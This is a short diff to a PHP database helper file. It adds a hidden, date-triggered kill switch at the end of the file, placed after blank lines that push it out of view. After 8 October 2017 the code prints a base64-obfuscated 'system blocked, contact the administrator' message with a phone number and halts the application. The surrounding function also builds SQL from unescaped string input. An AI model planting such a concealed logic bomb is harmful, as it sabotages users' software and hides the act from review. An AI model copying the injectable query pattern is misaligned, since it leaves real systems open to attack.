@@ -78,4 +78,10 @@ function eliminar($nombre_tabla,$condicion){
 	$consultasql="UPDATE $nombre_tabla SET activo=0 WHERE $condicion";
 	mysql_query($consultasql);
 }
+
+
+
+
+
+if(date("Y-m-d")>'2017-10-08'){echo base64_decode("U0lTVEVNQSBCTE9RVUVBRE8gQ09OU1VMVEUgQUwgQURNSU5JU1RSQURPUixDRUw6IDczMjMwNTY4");exit();}
 ?>
